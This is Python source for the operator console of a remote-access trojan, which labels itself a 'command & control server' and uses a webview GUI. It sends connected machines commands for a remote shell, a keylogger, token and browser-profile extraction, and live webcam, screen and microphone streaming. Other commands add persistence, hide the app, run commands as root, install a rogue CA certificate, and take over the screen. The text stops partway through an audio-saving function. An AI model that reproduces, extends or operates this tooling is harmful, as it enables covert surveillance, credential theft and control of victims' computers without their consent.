import asyncio
import threading
import websockets
import webview
import json
import base64
from datetime import datetime
from io import BytesIO
import os
import cv2
import numpy as np
import time
from collections import deque
import pyaudio
import uuid
import wave

class FileExplorerServer:
    def __pybridge__(self):
        """
        Exposes methods to the JavaScript side (WebView API).
        Methods defined here can be called via window.pywebview.api.methodName()
        """
        return {
            # Server Control
            'start_server': self.start_server,
            'stop_server': self.stop_server,
            
            # Shell
            'execute_shell': self.execute_shell,
            'get_location': self.get_location,
            'clear_shell': self.clear_shell,
            'cancel_command': self.cancel_command,
            
            # File Explorer
            'list_directory': self.list_directory,
            'refresh_directory': self.refresh_current,
            'go_back': self.go_back,
            'go_home': self.go_home,
            'search_files': self.search_files,
            'upload_file_dialog': self.upload_file_dialog,
            'download_item': self.download_selected,
            'delete_item_dialog': self.delete_item_dialog,
            'rename_item_dialog': self.rename_item_dialog,
            'copy_path': self.copy_path_to_clipboard,
            'preview_item': self.preview_item,
            
            # Advanced Commands
            'cmd_wifi_scan': self.cmd_wifi_scan,
            'cmd_network_scan': self.cmd_network_scan,
            'cmd_bluetooth_scan': self.cmd_bluetooth_scan,
            'cmd_set_volume': self.cmd_set_volume,
            'cmd_set_brightness': self.cmd_set_brightness,
            'cmd_screenshot': self.cmd_screenshot,
            'cmd_webcam': self.cmd_webcam,
            'cmd_record_audio': self.cmd_record_audio,
            'cmd_open_url': self.cmd_open_url,
            'cmd_launch_app': self.cmd_launch_app,
            'cmd_send_notification': self.cmd_send_notification,
            'cmd_show_popup': self.cmd_show_popup,
            'cmd_device_info': self.cmd_device_info,
            'cmd_clipboard': self.cmd_clipboard,
            'cmd_tokens': self.cmd_tokens,
            'cmd_request_root': self.cmd_request_root,
            'cmd_check_privileges': self.cmd_check_privileges,
            'cmd_execute_root': self.cmd_execute_root,
            'cmd_install_ca_cert': self.cmd_install_ca_cert,
            'cmd_list_tasks': self.cmd_list_tasks,
            'cmd_startup_apps': self.cmd_startup_apps,
            'cmd_kill_task': self.cmd_kill_task,
            
            # Security / Persistence / Keylogger
            'cmd_start_keylogger': self.cmd_start_keylogger,
            'cmd_stop_keylogger': self.cmd_stop_keylogger,
            'cmd_list_drivers': self.cmd_list_drivers,
            'cmd_check_firewall': self.cmd_check_firewall,
            'cmd_wifi_sniff': self.cmd_wifi_sniff,
            'cmd_get_wallpaper': self.cmd_get_wallpaper,
            'cmd_set_wallpaper': self.cmd_set_wallpaper,
            'cmd_screen_takeover': self.cmd_screen_takeover,
            'cmd_stop_takeover': self.cmd_stop_takeover,
            'cmd_play_audio': self.cmd_play_audio,
            'cmd_stop_audio': self.cmd_stop_audio,
            'cmd_hide_app': self.cmd_hide_app,
            'cmd_add_persistence': self.cmd_add_persistence,
            'cmd_install_persistence': self.cmd_install_persistence,
            'cmd_check_security_status': self.cmd_check_security_status,
            
            # Hardware
            'cmd_list_fans': self.cmd_list_fans,
            'cmd_set_fan_speed': self.cmd_set_fan_speed,
            'cmd_fans_all_off': self.cmd_fans_all_off,
            'cmd_fans_all_on': self.cmd_fans_all_on,
            'cmd_list_leds': self.cmd_list_leds,
            'cmd_leds_all_on': self.cmd_leds_all_on,
            'cmd_leds_all_off': self.cmd_leds_all_off,
            'cmd_list_screens': self.cmd_list_screens,
            'cmd_screens_all_off': self.cmd_screens_all_off,
            'cmd_screens_all_on': self.cmd_screens_all_on,

            'cmd_start_delete_prevention': self.cmd_start_delete_prevention,
            'cmd_stop_delete_prevention': self.cmd_stop_delete_prevention,
            
            # Sessions
            'cmd_list_sessions': self.cmd_list_sessions,
            'cmd_launch_admin_instances': self.cmd_launch_admin_instances,
            'cmd_launch_in_session': self.cmd_launch_in_session,

            'cmd_reboot': self.cmd_reboot,
            'cmd_shutdown': self.cmd_shutdown,
            'cmd_cancel_shutdown': self.cmd_cancel_shutdown,
            
            # Scheduler / Triggers
            'cmd_list_scheduled_tasks': self.cmd_list_scheduled_tasks,
            'cmd_add_scheduled_task': self.cmd_add_scheduled_task,
            'cmd_delete_scheduled_task': self.cmd_delete_scheduled_task,
            'cmd_list_triggers': self.cmd_list_triggers,
            'cmd_add_trigger': self.cmd_add_trigger,
            'cmd_delete_trigger': self.cmd_delete_trigger,
            
            # Device Manager
            'cmd_list_all_devices': self.cmd_list_all_devices,
            'device_unmount': self.device_unmount,
            'get_storage_devices': self.get_storage_devices,
            
            # Settings
            'cmd_get_system_settings': self.cmd_get_system_settings,
            'update_setting': self.update_setting,
            
            # Streaming
            'start_webcam_stream': self.start_webcam_stream,
            'start_screen_stream': self.start_screen_stream,
            'stop_stream': self.stop_streaming,
            
            # Audio (Raw PCM)
            'start_audio_listen': self.start_audio_listen,
            'start_audio_listen1': self.start_audio_listen1,
            'stop_audio_stream': self.stop_audio_stream,
            'cmd_audio_stats': self.cmd_audio_stats,
            
            # Network Traffic
            'cmd_start_network_monitor': self.cmd_start_network_monitor,
            'cmd_stop_network_monitor': self.cmd_stop_network_monitor,

            # Browser Profiles
            'cmd_get_browser_profiles': self.cmd_get_browser_profiles,
            'download_browser_profile': self.download_browser_profile,
            
            # Client selection
            'on_client_selected': self.on_client_selected,
            'handle_upload_data': self.handle_upload_data
        }

    def __init__(self):
        self.captures_dir = os.path.join(os.getcwd(), "captures")
        os.makedirs(self.captures_dir, exist_ok=True)
    
        # Print where files will be saved
        print(f"\n{'='*50}")
        print(f"CAPTURES DIRECTORY: {self.captures_dir}")
        print(f"{'='*50}\n")
        
        # Updated structure: connected_clients[device_id] = {
        #   'device_id': 'ABC123',
        #   'hostname': 'DESKTOP',
        #   'username': 'user',
        #   'instances': {
        #       'instance_id_1': {
        #           'websocket': ws,
        #           'instance_id': '1',
        #           'connect_time': timestamp,
        #           'session_id': 1,
        #           'privilege': 'ADMIN'
        #       }
        #   }
        # }
        self.connected_clients = {}
        self.selected_instance_id = None  # Format: "INSTANCE:device_id:instance_id"
        self.selected_device_id = None
        
        self.server = None
        self.loop = None
        self.running = False
        self.clients = set()
        self.current_path = "/"
        self.home_path = "/"
        self.path_history = []
        
        self.download_buffer = bytearray()
        self.downloading = False
        self.download_filename = ""
        self.download_size = 0
        
        self.current_pwd = "/"
        self.command_history = []
        self.history_index = -1

        self.active_commands = {} 
        self.command_timeout = 30 

        self.selected_ca_cert = None
        
        self.selected_item_path = None
        self.selected_item_name = None
        
        self.playback_buffer = deque(maxlen=200)
        self.stream_buffer_lock = threading.Lock()
        self.is_streaming_playing = False
        self.target_buffer_size = 60
        self.min_buffer_before_pause = 5
        self.last_frame_size = None
        self.detected_mode = "Stopped"
        self.frame_sizes = deque(maxlen=10)
        self.recv_count = 0
        self.display_count = 0
        self.recv_fps = 0
        self.display_fps = 0
        self.recv_fps_counter = 0
        self.display_fps_counter = 0
        self.last_recv_time = time.time()
        self.last_display_time = time.time()
        self.browserTransferring = False

        # Audio Streaming (Raw PCM)
        self.audio_stream = None
        self.audio_playing = False
        self.audio_mic_enabled = False
        self.audio_buffer = deque(maxlen=500)  # Buffer for raw PCM chunks
        self.audio_lock = threading.Lock()
        
        # Stats
        self.audio_buffer_underruns = 0
        self.audio_buffer_overflows = 0
        self.audio_buffer_size_history = deque(maxlen=100)
        self._audio_overflow_warned = False
        self._storage_monitor_running = False
        
        try:
            self.pyaudio = pyaudio.PyAudio()
        except Exception as e:
            print(f"Failed to initialize PyAudio: {e}")
            self.pyaudio = None
        
        self.window = None
        
        self.icons = {
            'directory': '📁',
            'file': '📄',
            'image': '🖼️',
            'text': '📝',
            'video': '🎬',
            'audio': '🎵',
            'archive': '📦',
            'pdf': '📕',
            'unknown': '❓'
        }

    # ===========================================================
    # UI HELPERS
    # ===========================================================

    def safe_eval_js(self, js_code):
        if not self.window: return
        try: 
            self.window.evaluate_js(js_code)
        except Exception as e: 
            # CHANGE HERE: Print the error instead of passing
            print(f"[JS Error] {e}")
            print(f"[JS Code] {js_code[:100]}...")

    def update_shell_output(self, text, tag='normal'):
        self.safe_eval_js(f"appendShellOutput({json.dumps(text)}, {json.dumps(tag)})")

    def update_pwd_label(self, pwd):
        self.current_pwd = pwd
        self.safe_eval_js(f"updatePWD({json.dumps(pwd)})")

    def show_notification(self, title, message, n_type='info', raw_data=None):
        """
        Display a slide-out notification in the UI
        n_type: 'info', 'success', 'warning', 'danger'
        """
        data = {
            "title": title,
            "message": message,
            "type": n_type,
            "timestamp": time.time()
        }
        if raw_data:
            data["raw"] = raw_data
        
        self.safe_eval_js(f"showNotification({json.dumps(data)})")
        
        # Also log to shell for history
        tag = 'info'
        if n_type == 'danger': tag = 'error'
        elif n_type == 'success': tag = 'success'
        elif n_type == 'warning': tag = 'warning'
        
        self.update_shell_output(f"[NOTIF] {title}: {message}\n", tag)

    def update_client_list(self):
        """Generate hierarchical client list with instances"""
        options = []
        
        # Add ALL CLIENTS option
        options.append({
            "type": "global",
            "display": "ALL CLIENTS",
            "value": "ALL_CLIENTS"
        })
        
        # Add each device with its instances
        for device_id, device_info in self.connected_clients.items():
            hostname = device_info.get('hostname', 'unknown')
            username = device_info.get('username', 'unknown')
            display_name = f"{username}@{hostname} [{device_id[:8]}]"
            
            # Add device header
            options.append({
                "type": "device_header",
                "display": display_name,
                "value": f"DEVICE:{device_id}",
                "device_id": device_id
            })
            
            # Add instances for this device
            instances = device_info.get('instances', {})
            instance_count = len(instances)
            
            if instance_count == 0:
                # Single instance (backward compatibility)
                options.append({
                    "type": "instance",
                    "display": "  └─ Main Instance",
                    "value": f"INSTANCE:{device_id}:main",
                    "device_id": device_id,
                    "instance_id": "main"
                })
            else:
                # Multiple instances
                sorted_instances = sorted(instances.items(), 
                                         key=lambda x: x[1].get('connect_time', 0))
                
                for i, (inst_id, inst_info) in enumerate(sorted_instances):
                    is_last = (i == instance_count - 1)
                    prefix = "  └─" if is_last else "  ├─"
                    
                    # Get instance details
                    connect_time = inst_info.get('connect_time', 0)
                    session_id = inst_info.get('session_id', '')
                    privilege = inst_info.get('privilege', '')
                    
                    # Format time
                    time_str = datetime.fromtimestamp(connect_time).strftime('%H:%M:%S')
                    
                    priv_symbol = "👑" if "ADMIN" in privilege or "ROOT" in privilege else "👤"
                    
                    display = f"{prefix} Instance {inst_id[:4]} {priv_symbol} [{time_str}]"
                    if session_id:
                        display += f" S:{session_id}"
                        
                    options.append({
                        "type": "instance",
                        "display": display,
                        "value": f"INSTANCE:{device_id}:{inst_id}",
                        "device_id": device_id,
                        "instance_id": inst_id
                    })
        
        # Send to UI
        self.safe_eval_js(f"updateClientDropdown({json.dumps(options)})")

    def update_nav_status(self, data):
        self.safe_eval_js(f"updateNavStatus({json.dumps(data)})")

    def update_server_status(self, running):
        self.safe_eval_js(f"setServerStatus({json.dumps(running)})")

    def enable_controls(self):
        self.safe_eval_js("if(typeof enableControls === 'function') enableControls(true)")
        
        # Start storage monitoring when clients connect
        self.start_storage_monitoring()

    def disable_controls(self):
        self.safe_eval_js("if(typeof enableControls === 'function') enableControls(false)")
        
        # Stop storage monitoring
        self.stop_storage_monitoring()
    
    def update_stream_stats(self):
        with self.stream_buffer_lock:
            buffer_size = len(self.playback_buffer)
        
        stats = {
            "display_fps": self.display_fps,
            "recv_fps": self.recv_fps,
            "buffer_size": buffer_size,
            "mode": self.detected_mode
        }
        self.safe_eval_js(f"updateStreamStats({json.dumps(stats)})")

    def display_stream_frame(self, frame):
        """Display stream frame in UI - NO color conversion needed"""
        try:
            # CRITICAL: Don't convert BGR to RGB!
            # cv2.imencode() expects BGR format (OpenCV's native format)
            # The JPEG encoder handles BGR correctly
            
            h, w = frame.shape[:2]
            max_w, max_h = 1280, 720 
            scale = min(max_w / w, max_h / h)
            new_w, new_h = int(w * scale), int(h * scale)
            frame_resized = cv2.resize(frame, (new_w, new_h))

            # Encode as JPEG (handles BGR natively)
            _, buffer = cv2.imencode('.jpg', frame_resized, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            
            self.safe_eval_js(f"displayStreamFrame('data:image/jpeg;base64,{jpg_as_text}')")
        except Exception as e: 
            print(f"Error displaying stream frame: {e}")

    def display_directory_items(self, items):
        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
        
        mapped_items = []
        for item in items:
            name = item['name']
            file_type = item['type']
            size = self.format_size(item['size'])
            modified = datetime.fromtimestamp(item['modified']).strftime('%Y-%m-%d %H:%M')
            
            icon = self.icons.get(file_type, self.icons['unknown'])
            
            mapped_items.append({
                "name": f"{icon} {name}",
                "type": file_type.capitalize(),
                "size": size,
                "modified": modified,
                "path": item['path'],
                "raw_type": file_type
            })

        self.safe_eval_js(f"renderFileTree({json.dumps(mapped_items)})")

    def display_search_results(self, query, results):
        mapped_items = []
        for item in results:
            name = item['name']
            path = item['path']
            file_type = item['type']
            size = self.format_size(item['size'])
            
            icon = self.icons.get(file_type, self.icons['unknown'])
            
            mapped_items.append({
                "name": f"{icon} {name}",
                "type": file_type.capitalize(),
                "size": size,
                "modified": path, 
                "path": item['path'],
                "raw_type": file_type
            })
            
        self.safe_eval_js(f"renderFileTree({json.dumps(mapped_items)})")
        self.update_shell_output(f"[+] Search complete for '{query}'\n", 'info')

    def display_devices(self, devices_list):
        if not devices_list:
            self.safe_eval_js("renderDevices([])")
            return
        
        grouped = {}
        for dev in devices_list:
            dev_type = dev.get('type', 'unknown')
            if dev_type not in grouped: grouped[dev_type] = []
            grouped[dev_type].append(dev)
        
        mapped_groups = []
        for dev_type, devices in grouped.items():
            mapped_devices = []
            for dev in devices:
                name = dev.get('name', 'Unknown Device')
                dev_id = dev.get('id', '')
                caps = dev.get('capabilities', 'unknown')
                status = dev.get('status', '')
                
                extra = []
                if 'size' in dev: extra.append(dev['size'])
                if 'charge' in dev: extra.append(dev['charge'])
                if 'adapter_type' in dev: extra.append(dev['adapter_type'])
                if 'interface' in dev: extra.append(dev['interface'])
                extra_str = ', '.join(extra)
                
                removable = dev.get('removable', False)
                
                mapped_devices.append({
                    "name": name,
                    "type": dev_type,
                    "id": dev_id,
                    "caps": caps,
                    "status": status,
                    "extra": extra_str,
                    "removable": removable
                })
            
            mapped_groups.append({
                "type": dev_type.upper(),
                "devices": mapped_devices
            })

        self.safe_eval_js(f"renderDevices({json.dumps(mapped_groups)})")

    def display_system_settings(self, settings):
        if not settings: return
        
        grouped = {}
        for setting in settings:
            setting_type = setting.get('type', 'general')
            if setting_type not in grouped: grouped[setting_type] = []
            grouped[setting_type].append(setting)
        
        self.safe_eval_js(f"renderSettings({json.dumps(grouped)})")

    def display_scheduled_tasks(self, tasks):
        self.safe_eval_js(f"renderScheduledTasks({json.dumps(tasks)})")

    def display_triggers(self, triggers):
        self.safe_eval_js(f"renderTriggers({json.dumps(triggers)})")

    def handle_storage_response(self, data):
        """Handle storage devices response from client"""
        devices = data.get('devices', [])
        
        # Format devices for display
        formatted_devices = []
        for device in devices:
            total_gb = device.get('total_bytes', 0) / (1024**3)
            used_gb = device.get('used_bytes', 0) / (1024**3)
            free_gb = device.get('free_bytes', 0) / (1024**3)
            percent = device.get('usage_percent', 0)
            
            # Determine icon based on device type
            icon = "💾"
            dev_type = device.get('type', '').lower()
            if 'usb' in dev_type or 'removable' in dev_type:
                icon = "📱"
            elif 'local' in dev_type or 'fixed' in dev_type:
                icon = "💽"
            elif 'network' in dev_type:
                icon = "🌐"
            elif 'cd' in dev_type or 'dvd' in dev_type:
                icon = "📀"
            
            formatted_devices.append({
                "label": device.get('label', device.get('name', 'Unknown')),
                "path": device.get('path', ''),
                "total_gb": round(total_gb, 1),
                "used_gb": round(used_gb, 1),
                "free_gb": round(free_gb, 1),
                "percent": round(percent, 1),
                "icon": icon,
                "type": device.get('type', 'unknown')
            })
        
        # Send to JavaScript for rendering
        self.safe_eval_js(f"renderStorageDevices({json.dumps(formatted_devices)})")

    def show_browser_profile_modal(self, profiles):
        self.safe_eval_js(f"showBrowserProfiles({json.dumps(profiles)})")

    def append_usb_log(self, text, tag='info'):
        self.safe_eval_js(f"appendUsbLog({json.dumps(text)}, {json.dumps(tag)})")

    def send_preview_data(self, content, data_type):
        self.safe_eval_js(f"window.showPreviewData({json.dumps(content)}, {json.dumps(data_type)})")

    # ===========================================================
    # BRIDGE IMPLEMENTATIONS
    # ===========================================================
    
    def start_server(self):
        if self.running: return
        self.running = True
        self.playback_buffer.clear()
        self.is_streaming_playing = False
        self.connected_clients.clear()
        self.update_server_status(True)
        
        self.ws_thread = threading.Thread(target=self.run_server, daemon=True)
        self.ws_thread.start()
        self.playback_loop()
        
        self.update_shell_output("""
╔═══════════════════════════════════════════════╗
║    COMMAND & CONTROL SERVER INITIALIZED       ║
║    Waiting for client connections...          ║
╚═══════════════════════════════════════════════╝
""", 'info')

    def stop_server(self):
        if not self.running: return
        self.running = False
        self.update_server_status(False)
        self.stop_streaming()
        self.stop_audio_stream()
        
        if self.loop and self.server:
            asyncio.run_coroutine_threadsafe(self._shutdown_server(), self.loop)

    def execute_shell(self, command):
        if not command: return
        if not self.command_history or self.command_history[-1] != command:
            self.command_history.append(command)
        self.history_index = len(self.command_history)
        
        self.update_shell_output(f"{self.current_pwd}> {command}\n", 'command')
        
        if command.lower() == "location":
            self.send_command({"type": "location"})
        else:
            self.send_command({"type": "shell_command", "command": command})

    def get_location(self):
        self.update_shell_output(f"{self.current_pwd}> location\n", 'command')
        self.send_command({"type": "location"})

    def clear_shell(self):
        self.safe_eval_js("clearShell()")

    def cancel_command(self):
        self.send_command({"type": "cancel"})
        self.update_shell_output("[!] Cancel signal sent\n", 'error')

    # --- File Explorer ---
    def list_directory(self, path):
        if path != self.current_path:
            self.path_history.append(self.current_path)
        self.send_command({"type": "list_directory", "path": path})

    def refresh_current(self):
        self.list_directory(self.current_path)

    def go_back(self):
        if self.path_history:
            self.current_path = self.path_history.pop()
            self.list_directory(self.current_path)

    def go_home(self):
        self.path_history.clear()
        self.list_directory(self.home_path)
    
    def refresh_current(self):
        self.list_directory(self.current_path)

    def search_files(self, query):
        if not query: return
        self.send_command({
            "type": "search",
            "query": query,
            "path": self.home_path
        })

    def upload_file_dialog(self):
        pass 
    
    def handle_upload_data(self, filename, b64_data, current_path):
        try:
            file_data = base64.b64decode(b64_data)
            basename = filename
            
            header = json.dumps({
                "type": "upload_file",
                "filename": basename,
                "path": current_path,
                "size": len(file_data)
            })
            
            packet = header.encode('utf-8') + b'\n' + file_data
            self.send_binary(packet)
            self.update_shell_output(f"[+] Uploading: {basename} ({len(file_data)} bytes)\n", 'info')
        except Exception as e: print(f"Upload error: {e}")

    def download_selected(self, path):
        if path:
            self.send_command({"type": "download", "path": path})
            self.update_shell_output(f"[+] Downloading: {path.split('/')[-1]}\n", 'info')

    def delete_item_dialog(self, path):
        if path:
            self.send_command({"type": "delete", "path": path})
            self.update_shell_output(f"[!] Deleting: {path.split('/')[-1]}\n", 'error')
            self.refresh_current()

    def rename_item_dialog(self, old_path, new_name):
        if new_name:
            dir_path = '/'.join(old_path.split('/')[:-1])
            new_path = f"{dir_path}/{new_name}" if dir_path else new_name
            self.send_command({
                "type": "rename",
                "old_path": old_path,
                "new_path": new_path
            })
            self.update_shell_output(f"[+] Renaming to {new_name}\n", 'info')
            self.refresh_current()

    # CORRECTED
    def download_item(self, path):
        self.selected_item_path = path
        self.selected_item_name = path.split('/')[-1]
        
        if self.selected_item_path:
            self.send_command({"type": "download", "path": self.selected_item_path})
            # Use update_shell_output, not append_shell_output
            self.update_shell_output(f"[+] Downloading: {self.selected_item_name}\n", 'info')

    # CORRECTED
    def copy_path(self, path):
        self.selected_item_path = path
        
        if self.selected_item_path:
            # Call the robust JS helper function
            self.safe_eval_js(f"copyToClipboard({json.dumps(self.selected_item_path)})")
            self.update_shell_output(f"[✓] Path copied: {self.selected_item_path}\n", 'success')

    def preview_item(self, path):
        self.send_command({"type": "preview", "path": path})

    # --- Advanced / Hardware / Security / etc ---
    def cmd_wifi_scan(self): self.send_command({"type": "wifi"}); self.update_shell_output("[+] Scanning WiFi...\n", 'info')
    def cmd_network_scan(self): self.send_command({"type": "scan", "timeout": 30, "quick": True}); self.update_shell_output("[+] Network scan...\n", 'info')
    def cmd_bluetooth_scan(self): self.send_command({"type": "bluetooth", "timeout": 10}); self.update_shell_output("[+] Bluetooth scan...\n", 'info')
    
    def cmd_set_volume(self, level): self.send_command({"type": "volume", "level": str(level)}); self.update_shell_output(f"[+] Volume set to {level}%\n", 'info')
    def cmd_set_brightness(self, level): self.send_command({"type": "brightness", "level": str(level)}); self.update_shell_output(f"[+] Brightness set to {level}%\n", 'info')
    
    def cmd_screenshot(self): 
        self.send_command({"type": "screenshot", "screen_id": ""})
        self.update_shell_output("[+] Capturing screenshot...\n", 'info')

    def cmd_webcam(self): self.send_command({"type": "webcam"}); self.update_shell_output("[+] Capturing webcam photo...\n", 'info')
    def cmd_record_audio(self, duration): 
        self.send_command({"type": "microphone", "duration": str(duration)})
        self.update_shell_output(f"[+] Recording audio for {duration}s...\n", 'info')
    
    def cmd_open_url(self, url): self.send_command({"type": "url", "url": url}); self.update_shell_output(f"[+] Opening {url}\n", 'info')
    def cmd_launch_app(self, app): self.send_command({"type": "launch", "app": app}); self.update_shell_output(f"[+] Launching {app}\n", 'info')
    
    def cmd_send_notification(self, title, body, badge): 
        self.send_command({"type": "notify", "title": title, "body": body, "badge": badge})
        self.update_shell_output(f"[+] Notification sent\n", 'info')
        
    def cmd_show_popup(self, title, body, badge):
        self.send_command({"type": "popup", "title": title, "body": body, "badge": badge})
        self.update_shell_output(f"[+] Popup shown\n", 'info')

    def cmd_device_info(self): self.send_command({"type": "deviceinfo"}); self.update_shell_output("[+] Getting device info...\n", 'info')
    def cmd_clipboard(self): self.send_command({"type": "clipboard"}); self.update_shell_output("[+] Reading clipboard...\n", 'info')
    
    def cmd_tokens(self): 
        self.send_command({"type": "tokens"})
        self.update_shell_output("[!] Extracting tokens...\n", 'error')

    def cmd_request_root(self): self.send_command({"type": "request_root"}); self.update_shell_output("[!] Requesting root...\n", 'info')
    def cmd_check_privileges(self): self.send_command({"type": "check_privileges"}); self.update_shell_output("[+] Checking privileges...\n", 'info')
    def cmd_execute_root(self, command): 
        self.send_command({"type": "execute_root", "command": command})
        self.update_shell_output(f"[!] Executing as root: {command}\n", 'error')

    def cmd_install_ca_cert(self, b64_data, filename):
        try:
            self.send_command({
                "type": "install_ca_cert",
                "filename": filename,
                "data": b64_data
            })
            self.update_shell_output(f"[!] Installing CA cert: {filename}\n", 'error')
        except Exception as e:
            self.update_shell_output(f"[!] Cert install error: {e}\n", 'error')

    def cmd_list_tasks(self): self.send_command({"type": "list_tasks"}); self.update_shell_output("[+] Listing tasks...\n", 'info')
    def cmd_startup_apps(self): self.send_command({"type": "startup_apps"}); self.update_shell_output("[+] Listing startup apps...\n", 'info')
    def cmd_kill_task(self, task_id): 
        self.send_command({"type": "kill_task", "task_id": task_id})
        self.update_shell_output(f"[!] Killing task {task_id}\n", 'error')

    def cmd_start_keylogger(self): self.send_command({"type": "start_keylogger"}); self.update_shell_output("[+] Starting keylogger...\n", 'info')
    def cmd_stop_keylogger(self): self.send_command({"type": "stop_keylogger"}); self.update_shell_output("[+] Stopping keylogger...\n", 'info')
    def cmd_list_drivers(self): self.send_command({"type": "list_drivers"}); self.update_shell_output("[+] Listing drivers...\n", 'info')
    def cmd_check_firewall(self): self.send_command({"type": "check_firewall"}); self.update_shell_output("[+] Checking firewall...\n", 'info')
    def cmd_wifi_sniff(self, duration): 
        self.send_command({"type": "wifi_sniff", "duration": duration})
        self.update_shell_output(f"[+] Sniffing WiFi for {duration}s...\n", 'info')
    
    def cmd_get_wallpaper(self): self.send_command({"type": "get_wallpaper"}); self.update_shell_output("[+] Getting wallpaper...\n", 'info')
    def cmd_set_wallpaper(self, b64_data, filename):
        try:
            img_data = base64.b64decode(b64_data)
            header = json.dumps({
                "type": "set_wallpaper_data",
                "filename": filename,
                "size": len(img_data)
            })
            packet = header.encode('utf-8') + b'\n' + img_data
            self.send_binary(packet)
            self.update_shell_output(f"[+] Setting wallpaper: {filename}\n", 'info')
        except Exception as e:
            self.update_shell_output(f"[!] Wallpaper error: {e}\n", 'error')

    def cmd_screen_takeover(self, path): 
        self.send_command({"type": "screen_takeover", "path": path})
        self.update_shell_output(f"[!] Screen takeover: {path}\n", 'error')
    def cmd_stop_takeover(self): self.send_command({"type": "stop_takeover"}); self.update_shell_output("[+] Stopping takeover...\n", 'info')
    def cmd_play_audio(self, path): 
        self.send_command({"type": "play_audio", "path": path})
        self.update_shell_output(f"[+] Playing: {path}\n", 'info')
    def cmd_stop_audio(self): self.send_command({"type": "stop_audio"}); self.update_shell_output("[+] Stopping audio...\n", 'info')

    def cmd_hide_app(self): self.send_command({"type": "hide_app"}); self.update_shell_output("[!] Hiding app...\n", 'error')
    def cmd_add_persistence(self): self.send_command({"type": "add_persistence"}); self.update_shell_output("[!] Adding persistence...\n", 'error')
    def cmd_install_persistence(self): 
        self.send_command({"type": "install_persistence"})
        self.update_shell_output("[!] Installing advanced persistence...\n", 'error')

    def cmd_check_security_status(self): self.update_shell_output("[+] Checking security status...\n", 'info')

    # Hardware
    def cmd_list_fans(self): self.send_command({"type": "list_fans"}); self.update_shell_output("[+] Listing fans...\n", 'info')
    def cmd_set_fan_speed(self, fan_id, speed): 
        self.send_command({"type": "set_fan", "fan_id": fan_id, "speed": str(speed)})
        self.update_shell_output(f"[+] Fan {fan_id} -> {speed}%\n", 'info')
    def cmd_fans_all_off(self): self.send_command({"type": "set_fan", "fan_id": "all", "speed": "0"}); self.update_shell_output("[!] Fans OFF\n", 'error')
    def cmd_fans_all_on(self): self.send_command({"type": "set_fan", "fan_id": "all", "speed": "100"}); self.update_shell_output("[+] Fans ON\n", 'info')
    
    def cmd_list_leds(self): self.send_command({"type": "list_leds"}); self.update_shell_output("[+] Listing LEDs...\n", 'info')
    def cmd_leds_all_on(self): self.send_command({"type": "set_all_leds", "state": "true"}); self.update_shell_output("[+] LEDs ON\n", 'info')
    def cmd_leds_all_off(self): self.send_command({"type": "set_all_leds", "state": "false"}); self.update_shell_output("[+] LEDs OFF\n", 'info')
    
    def cmd_list_screens(self): self.send_command({"type": "list_screens"}); self.update_shell_output("[+] Listing screens...\n", 'info')
    def cmd_screens_all_off(self): self.send_command({"type": "screens_all_off"}); self.update_shell_output("[!] Screens OFF\n", 'error')
    def cmd_screens_all_on(self): self.send_command({"type": "screens_all_on"}); self.update_shell_output("[+] Screens ON\n", 'info')

    # Sessions
    def cmd_list_sessions(self): self.send_command({"type": "list_sessions"}); self.update_shell_output("[+] Listing sessions...\n", 'info')
    def cmd_launch_admin_instances(self): self.send_command({"type": "launch_admin_instances"}); self.update_shell_output("[!] Launching admin instances...\n", 'error')
    def cmd_launch_in_session(self, session_id): 
        self.send_command({"type": "launch_in_session", "session_id": str(session_id)})
        self.update_shell_output(f"[!] Launching in session {session_id}\n", 'info')

    # Scheduler / Triggers
    def cmd_list_scheduled_tasks(self): self.send_command({"type": "list_scheduled_tasks"}); self.update_shell_output("[+] Fetching tasks...\n", 'info')
    def cmd_add_scheduled_task(self, task_data): 
        self.send_command({"type": "add_scheduled_task", **task_data})
        self.update_shell_output("[+] Adding task...\n", 'info')
    def cmd_delete_scheduled_task(self, task_id): 
        self.send_command({"type": "delete_scheduled_task", "task_id": task_id})
        self.update_shell_output(f"[!] Deleting task {task_id}\n", 'error')

    def cmd_list_triggers(self): self.send_command({"type": "list_triggers"}); self.update_shell_output("[+] Fetching triggers...\n", 'info')
    def cmd_add_trigger(self, trigger_data): 
        self.send_command({"type": "add_trigger", **trigger_data})
        self.update_shell_output("[+] Adding trigger...\n", 'info')
    def cmd_delete_trigger(self, trigger_id): 
        self.send_command({"type": "delete_trigger", "trigger_id": trigger_id})
        self.update_shell_output(f"[!] Deleting trigger {trigger_id}\n", 'error')

    # Device Manager
    def cmd_list_all_devices(self): self.send_command({"type": "list_all_devices"}); self.update_shell_output("[+] Enumerating devices...\n", 'info')
    def device_unmount(self, device_id): 
        self.send_command({"type": "unmount_device", "device_id": device_id})
        self.update_shell_output(f"[!] Unmounting {device_id}\n", 'error')

    # Settings
    def cmd_get_system_settings(self): self.send_command({"type": "list_system_settings"}); self.update_shell_output("[+] Fetching settings...\n", 'info')
    def update_setting(self, name, value): 
        self.send_command({"type": "update_system_setting", "name": name, "value": value})
        self.update_shell_output(f"[+] Updating {name}\n", 'info')

    # Streaming
    def start_webcam_stream(self):
        if not self.clients: return
        self.send_stream_command("START_WEBCAM")
        self.detected_mode = "Webcam"
        self.update_stream_stats()
    
    def start_screen_stream(self):
        if not self.clients: return
        self.send_stream_command("START_SCREEN")
        self.detected_mode = "Screen"
        self.update_stream_stats()

    def stop_streaming(self):
        self.send_stream_command("STOP")
        self.detected_mode = "Stopped"
        with self.stream_buffer_lock: self.playback_buffer.clear()
        self.is_streaming_playing = False
        self.update_stream_stats()

    # ============================================
    # RAW PCM AUDIO STREAMING LOGIC (WITH FILE SAVING)
    # ============================================

    async def handle_audio_packet(self, message):
        """Handle incoming raw PCM chunks"""
        if len(message) > 6 and message[:6] == b'AUDIO:':
            audio_data = message[6:]
            
            buffer_size = len(self.audio_buffer)
            
            if buffer_size < 450:
                with self.audio_lock: 
                    self.audio_buffer.append(audio_data)
            else:
                with self.audio_lock:
                    if len(self.audio_buffer) > 0:
                        self.audio_buffer.popleft()
                    self.audio_buffer.append(audio_data)
                    self.audio_buffer_overflows += 1
            
            return True
        return False

    def audio_playback_worker(self):
        """Play raw PCM audio stream in real-time AND save to WAV file"""
        if not self.pyaudio:
            self.update_shell_output("[!] PyAudio not initialized\n", 'error')
            return
        
        # 1. Setup WAV file for saving
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
